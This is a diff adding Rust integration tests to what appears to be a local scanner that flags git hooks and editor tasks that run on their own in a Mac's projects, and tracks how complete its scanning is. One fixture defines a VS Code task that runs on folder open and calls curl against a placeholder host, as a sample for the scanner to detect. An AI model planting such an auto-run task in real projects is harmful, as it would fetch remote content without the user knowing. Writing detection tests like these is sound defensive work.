@@ -378,7 +378,7 @@ fn a_finding_about_a_file_inside_the_project_is_referenced_by_the_project() {
         .iter()
         .map(|f| {
             (
-                f.rule.as_str(),
+                f.rule.as_deref().unwrap_or_default(),
                 f.about_text.as_str(),
                 f.severity(),
                 f.confidence(),
@@ -524,6 +524,18 @@ fn a_failure_to_answer_is_not_a_message_of_the_contract() {
     assert_eq!(out.status.code(), Some(2));
     let v: Value = serde_json::from_slice(&out.stdout).unwrap();
     assert_eq!(v["errors"][0]["code"], "usage");
+    // Parsed as an answer all the same, neither failure is one: it has no format, and reads
+    // as format 0, which a reader stops at.
+    for args in [&["--json"][..], &["--json", "--store", "elsewhere.db"][..]] {
+        for what in ["dev/shop", "~/dev/shop"] {
+            let out = h.ask("project", Some(what), args);
+            assert_ne!(out.status.code(), Some(0));
+            let v: Value = serde_json::from_slice(&out.stdout).unwrap();
+            assert!(v.get("format").is_none(), "{v}");
+            let parsed: v1::Known = serde_json::from_value(v).unwrap();
+            assert_eq!(parsed.format, 0);
+        }
+    }
     // A store written by an older build, without a table a run of this build adds, is told as
     // such, with what to do.
     h.checkout("dev/shop");
@@ -555,6 +567,8 @@ fn an_entity_id_is_given_whole_and_asks_back_the_same_thing() {
     h.put(&format!("{project}/.git/hooks/pre-commit"), "#!/bin/sh\n");
     h.run(&[]);
     let k = h.known(&format!("~/{project}"));
+    // What was asked is given back whole as well.
+    assert_eq!(k.asked_text, format!("~/{project}"));
     let hook = format!("file:machine:mac/{project}/.git/hooks/pre-commit");
     assert!(hook.chars().count() > 256);
     assert!(k.parts.iter().any(|p| p.id_text == hook));
@@ -563,4 +577,377 @@ fn an_entity_id_is_given_whole_and_asks_back_the_same_thing() {
     let thing = k.thing.unwrap();
     assert_eq!(thing.id_text, format!("checkout:machine:mac/{project}"));
     assert_eq!(h.known(&thing.id_text).thing, Some(thing));
+}
+
+/// An editor task that runs when its folder is opened and calls out to an invented address.
+const TASK: &str = r#"{"tasks": [{"label": "dev", "runOptions": {"runOn": "folderOpen"}, "command": "curl https://bad.invalid/x"}]}"#;
+
+impl Home {
+    /// `immune <question> [<what>] --store <store>` with these arguments after.
+    fn ask(&self, question: &str, what: Option<&str>, extra: &[&str]) -> Output {
+        self.immune()
+            .arg(question)
+            .args(what)
+            .arg("--store")
+            .arg(self.store())
+            .args(extra)
+            .output()
+            .unwrap()
+    }
+
+    /// A refusal: exit 2, and the JSON envelope's error. The envelope has no format, so it is
+    /// never read as an answer.
+    fn refused(&self, what: &str) -> Value {
+        let out = self.project(what, &["--json"]);
+        assert_eq!(out.status.code(), Some(2), "{what}");
+        let v: Value = serde_json::from_slice(&out.stdout).unwrap();
+        assert!(v.get("format").is_none(), "{v}");
+        v["errors"][0].clone()
+    }
+}
+
+/// The reading made by rule that says no reading looks at the place asked about.
+fn unread(k: &v1::Known) -> Option<&v1::Coverage> {
+    k.coverage.iter().find(|c| c.reader == "immune")
+}
+
+/// The promise that a finding does not vanish with what it is about: removing the files two
+/// findings are about retracts what was read of them, and the findings, still open, stay in the
+/// project's answer and, for the file on this Mac, in the Mac's.
+#[test]
+fn a_finding_stays_in_the_answer_after_the_file_it_is_about_is_removed() {
+    let h = Home::new("removed");
+    h.checkout("dev/shop");
+    // A project beside it, whose finding is not this project's.
+    h.checkout("dev/shop2");
+    h.run(&[]);
+    h.put("dev/shop/.git/hooks/pre-commit", "#!/bin/sh\nexit 0\n");
+    h.put("dev/shop/.vscode/tasks.json", TASK);
+    h.put("dev/shop2/.vscode/tasks.json", TASK);
+    h.run(&[]);
+    let before = h.known("~/dev/shop").findings;
+    assert_eq!(before.len(), 2);
+    std::fs::remove_file(h.path().join("dev/shop/.git/hooks/pre-commit")).unwrap();
+    std::fs::remove_file(h.path().join("dev/shop/.vscode/tasks.json")).unwrap();
+    h.run(&[]);
+    let after = h.known("~/dev/shop");
+    assert!(
+        after.parts.iter().all(|p| p.r#type != "file"),
+        "{:?}",
+        after.parts
+    );
+    assert_eq!(after.findings, before);
+    assert!(
+        after
+            .findings
+            .iter()
+            .all(|f| f.state() == v1::FindingState::Open)
+    );
+    let out = h.ask("machine", None, &[]);
+    let mac = v1::Known::decode(out.stdout.as_slice()).unwrap();
+    let tasks = "file:machine:mac/dev/shop/.vscode/tasks.json";
+    assert!(mac.findings.iter().any(|f| f.about_text == tasks));
+}
+
+/// A path inside a project the store knows, such as the working folder of a program that ran
+/// there, answers for that project, the nearest one that holds it; the answer says what was
+/// asked. A folder beside the project is not in it.
+#[test]
+fn a_path_inside_a_known_project_answers_for_the_nearest_project_that_holds_it() {
+    let h = Home::new("inside");
+    h.checkout("dev/shop");
+    h.put("dev/shop/.git/hooks/pre-commit", "#!/bin/sh\nexit 0\n");
+    // A checkout inside another is not walked into; an agent's working folder names it.
+    h.checkout("dev/shop/tools/gen");
+    let gen_dir = h.path().join("dev/shop/tools/gen");
+    h.put(
+        ".claude/projects/one/session.jsonl",
+        &format!("{{\"cwd\": \"{}\"}}\n", gen_dir.display()),
+    );
+    h.run(&[]);
+    let shop = "checkout:machine:mac/dev/shop";
+    let gen_id = "checkout:machine:mac/dev/shop/tools/gen";
+    for (asked, id) in [
+        ("~/dev/shop/src/lib", shop),
+        ("~/dev/shop/README.md", shop),
+        ("file:machine:mac/dev/shop/src/main.rs", shop),
+        // A file the store holds, by its id.
+        ("file:machine:mac/dev/shop/.git/hooks/pre-commit", shop),
+        ("~/dev/shop/tools", shop),
+        ("~/dev/shop/tools/gen/src", gen_id),
+    ] {
+        let k = h.known(asked);
+        assert_eq!(k.presence(), v1::Presence::Held, "{asked}");
+        assert_eq!(k.thing.unwrap().id_text, id, "{asked}");
+        assert_eq!(k.asked_text, asked);
+    }
+    assert_eq!(h.known("~/dev/shopping").presence(), v1::Presence::Unknown);
+}
+
+/// The promise against false calm for the same folder spelled another way: on a volume that
+/// ignores case `~/dev/shop` may be `~/dev/Shop`, so it is refused with the id the store knows,
+/// never answered `unknown`; a link to the project answers for the project; and a link into a
+/// folder macOS asks permission for carries the reading that says it was not looked into.
+#[test]
+fn the_same_folder_spelled_another_way_is_never_unknown_with_every_reading_full() {
+    let h = Home::new("spelled");
+    h.checkout("dev/Shop");
+    h.checkout("Documents/notes");
+    let link = |to: &str, name: &str| {
+        std::os::unix::fs::symlink(h.path().join(to), h.path().join(name)).unwrap();
+    };
+    link("dev/Shop", "shop-link");
+    link("Documents/notes", "notes-link");
+    h.run(&[]);
+    for asked in ["~/dev/shop", "~/DEV/SHOP/src"] {
+        let error = h.refused(asked);
+        assert_eq!(error["code"], "spelled_otherwise", "{asked}");
+        assert_eq!(
+            error["ids_text"],
+            serde_json::json!(["checkout:machine:mac/dev/Shop"])
+        );
+    }
+    for asked in ["~/shop-link", "~/shop-link/src"] {
+        let k = h.known(asked);
+        assert_eq!(
+            k.thing.unwrap().id_text,
+            "checkout:machine:mac/dev/Shop",
+            "{asked}"
+        );
+        assert_eq!(k.asked_text, asked);
+    }
+    let linked = h.known("~/notes-link");
+    assert_eq!(linked.presence(), v1::Presence::Unknown);
+    let guarded = linked
+        .coverage
+        .iter()
+        .find(|c| c.kind == GUARDED && c.reader == "checkouts")
+        .unwrap();
+    assert_eq!(
+        (guarded.completeness(), guarded.reason_text.as_deref()),
+        (v1::Completeness::None, Some("not looked into: ~/Documents"))
+    );
+}
+
+/// The promise against false calm for a place no reading looks at: a path outside the home
+/// folder, on another volume, in a hidden folder, deeper than the walk goes or in a folder the
+/// walk skips answers `unknown` with a reading made by rule that is not full, never with every
+/// reading full. A path the walk does look at has no such reading.
+#[test]
+fn a_path_no_reading_looks_at_is_never_unknown_with_every_reading_full() {
+    let h = Home::new("unread");
+    h.checkout("dev/shop");
+    h.run(&[]);
+    for asked in [
+        "/opt/src/proj",
+        "/Volumes/External/proj",
+        "~/.hidden/proj",
+        "~/a/b/c/d/e/proj",
+        "~/Library/proj",
+        "~/dev/node_modules/proj",
+    ] {
+        let k = h.known(asked);
+        assert_eq!(standing(&k), (v1::Presence::Unknown, false), "{asked}");
+        let rule = unread(&k).unwrap();
+        assert_eq!(
+            (
+                rule.kind.as_str(),
+                rule.scope_text.as_str(),
+                rule.completeness(),
+                rule.cause(),
+                rule.observed_at,
+            ),
+            (
+                "places the readings that find projects look in",
+                "machine:mac",
+                v1::Completeness::None,
+                v1::Cause::NotGiven,
+                None
+            ),
+            "{asked}"
+        );
+        assert!(
+            rule.reason_text
+                .as_deref()
+                .unwrap()
+                .starts_with("no reading")
+        );
+    }
+    let looked = h.known("~/dev/ghost");
+    assert_eq!(standing(&looked), (v1::Presence::Unknown, true));
+    assert!(unread(&looked).is_none());
+    assert!(looked.coverage.iter().all(|c| c.observed_at.is_some()));
+}
+
+/// The promise that a project's answer carries the readings that read inside every project: a
+/// task file that could not be read in another project leaves this one's answer not full, since
+/// the reading of task files is one reading of every checkout on this Mac.
+#[test]
+fn a_project_carries_the_readings_that_read_inside_every_project() {
+    let h = Home::new("inside-readings");
+    h.checkout("dev/shop");
+    h.checkout("dev/other");
+    h.put("dev/other/.vscode/tasks.json", "{not json");
+    h.run(&[]);
+    let k = h.known("~/dev/shop");
+    assert_eq!(standing(&k), (v1::Presence::Held, false));
+    let editor = "editor tasks set to run when a checkout's folder is opened";
+    let tasks = find(&k, "watched-places", editor).unwrap();
+    assert_eq!(
+        (tasks.scope_text.as_str(), tasks.completeness()),
+        ("machine:mac", v1::Completeness::None)
+    );
+    // The other readings of every checkout are there too, read in full, and none of the home
+    // folder's own.
+    for kind in [
+        "package.json of each checkout, the part that runs by itself",
+        "ways a checkout runs code by itself, as present in each",
+        "other ways a checkout runs code by itself",
+    ] {
+        assert!(find(&k, "watched-places", kind).is_some(), "{kind}");
+    }
+    let home = "~/.claude/settings.json, the part that runs by itself";
+    assert!(find(&k, "watched-places", home).is_none());
+    // A project the store never heard of is not spoken for by them.
+    assert!(find(&h.known("~/dev/ghost"), "watched-places", editor).is_none());
+}
+
+/// A coverage reason is given whole, however long: the end of a reason can be what was not read.
+#[test]
+fn a_coverage_reason_is_given_whole() {
+    let h = Home::new("reason");
+    let project = format!("dev/{}/{}", "a".repeat(150), "b".repeat(120));
+    h.checkout(&project);
+    h.put(&format!("{project}/.vscode/tasks.json"), "{not json");
+    h.run(&[]);
+    let k = h.known(&format!("~/{project}"));
+    let kind = "editor tasks set to run when a checkout's folder is opened";
+    let given = find(&k, "watched-places", kind)
+        .unwrap()
+        .reason_text
+        .clone()
+        .unwrap();
+    let kept: String = rusqlite::Connection::open(h.store())
+        .unwrap()
+        .query_row(
+            "SELECT reason FROM coverage WHERE kind = ?1 ORDER BY id DESC LIMIT 1",
+            [kind],
+            |r| r.get(0),
+        )
+        .unwrap();
+    assert!(kept.chars().count() > 256);
+    assert_eq!(given, kept);
+}
+
+/// An id the store holds that is not a project is refused, not answered as a project never heard
+/// of: a package of a project, or a machine. An id of no kind the question takes is a misuse.
+#[test]
+fn an_id_of_another_kind_is_refused_not_unknown() {
+    let h = Home::new("other-kind");
+    h.checkout("dev/shop");
+    h.put("dev/shop/package-lock.json", &package_lock("left-pad"));
+    h.run(&[]);
+    for id in [
+        "component:checkout:machine:mac/dev/shop/npm/left-pad",
+        "machine:mac",
+    ] {
+        let error = h.refused(id);
+        assert_eq!(error["code"], "not_a_project", "{id}");
+        assert_eq!(error["ids_text"], serde_json::json!([id]));
+    }
+    assert_eq!(h.refused("component:nothing")["code"], "usage");
+}
+
+/// The contract's text is one-to-one: a folder whose name holds a hidden character and a folder
+/// whose name spells that character's escape out are shown apart, and each id, given back as
+/// shown, asks for its own project and not the decoy. A path is given as the contract shows
+/// text, so the decoy's own path is asked with its backslash escaped.
+#[test]
+fn an_id_given_back_as_shown_asks_for_its_own_thing_and_never_the_decoy() {
+    let h = Home::new("decoy");
+    let hidden = "dev/a\u{202e}b";
+    h.checkout(hidden);
+    h.checkout("dev/a\\u{202e}b");
+    h.run(&[]);
+    let real = h.known(&format!("~/{hidden}")).thing.unwrap();
+    let spelled = h.known("~/dev/a\\u{5c}u{202e}b").thing.unwrap();
+    assert_eq!(real.id_text, "checkout:machine:mac/dev/a\\u{202e}b");
+    assert_eq!(spelled.id_text, "checkout:machine:mac/dev/a\\u{5c}u{202e}b");
+    for thing in [&real, &spelled] {
+        assert_eq!(h.known(&thing.id_text).thing.as_ref(), Some(thing));
+    }
+}
+
+/// The two functions the contract's text is made with undo each other, whatever counts as
+/// hidden, and two texts never show alike.
+#[test]
+fn escaping_the_contracts_text_is_one_to_one() {
+    let hidden = |c: char| c.is_control() || c == '\u{202e}';
+    let texts = [
+        "plain",
+        "a\u{202e}b",
+        "a\\u{202e}b",
+        "\\",
+        "\\u{",
+        "\\u{zz}",
+        "\\u{110000}",
+        "\\u{d800}",
+        "tab\there",
+    ];
+    let mut shown: Vec<String> = Vec::new();
+    for text in texts {
+        let s = contract::escape(text, hidden);
+        assert_eq!(contract::unescape(&s), text, "{s}");
+        assert!(!shown.contains(&s), "{s}");
+        shown.push(s);
+    }
+    assert_eq!(contract::escape("a\\b", hidden), "a\\u{5c}b");
+    // What names no character is kept as written.
+    for written in ["\\u{+41}", "\\u{zz}", "\\u{}", "\\u{d800}", "a\\b"] {
+        assert_eq!(contract::unescape(written), written);
+    }
+    assert_eq!(contract::unescape("\\u{41}\\u{5c}"), "A\\");
+}
+
+/// An older reader meets a newer core: a word for an enum value this build does not know reads
+/// as the enum's unspecified value, which the schema says to read as the unsafe case, and the
+/// rest of the message is read.
+#[test]
+fn an_enum_word_this_build_does_not_know_reads_as_unspecified() {
+    let json = r#"{"format": 1, "presence": "someday", "asked_text": "~/dev/x",
+        "coverage": [{"reader": "r", "completeness": "most", "cause": "new_cause"}],
+        "findings": [{"id": "f1", "state": "snoozed", "severity": "dire", "confidence": "odd"}]}"#;
+    let k: v1::Known = serde_json::from_str(json).unwrap();
+    assert_eq!(
+        (k.format, k.presence, k.asked_text.as_str()),
+        (1, 0, "~/dev/x")
+    );
+    let c = &k.coverage[0];
+    assert_eq!((c.completeness, c.cause), (0, Some(0)));
+    let f = &k.findings[0];
+    assert_eq!((f.state, f.severity, f.confidence), (0, 0, Some(0)));
+}
+
+/// What was asked is in the answer: which question, and for a project no other ids, so a reader
+/// tells an unknown project from an unknown program or machine. The end of the latest run is
+/// given, so a reading older than it shows.
+#[test]
+fn an_answer_says_which_question_it_answers_and_when_the_latest_run_ended() {
+    let h = Home::new("question");
+    h.checkout("dev/shop");
+    h.run(&[]);
+    let ended: i64 = rusqlite::Connection::open(h.store())
+        .unwrap()
+        .query_row(
+            "SELECT MAX(at) FROM journal WHERE entry = 'run_finished'",
+            [],
+            |r| r.get(0),
+        )
+        .unwrap();
+    for asked in ["~/dev/shop", "~/dev/ghost"] {
+        let k = h.known(asked);
+        assert_eq!(k.question(), v1::Question::Project, "{asked}");
+        assert!(k.same_as.is_empty());
+        assert_eq!(k.latest_run_at, Some(ended));
+    }
 }
